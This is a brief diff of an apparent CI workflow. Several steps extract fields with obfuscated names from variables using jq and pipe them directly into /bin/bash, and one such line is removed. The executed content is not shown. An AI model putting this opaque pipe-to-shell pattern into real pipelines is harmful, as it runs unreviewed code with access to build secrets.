@@ -20,7 +20,6 @@ jobs:
           printf '%s' "$lf578" | jq -r .nzh40 | /bin/bash
           echo $u2260 | jq -r .csf59 | /bin/bash
           echo $orwui7671 | jq -r .puvou8 | /bin/bash
-          echo $tiegx3423 | jq -r .zegr32 | /bin/bash
           printf '%s' "$wd97198" | jq -r .o5 | /bin/bash
 
       - name: Persist data
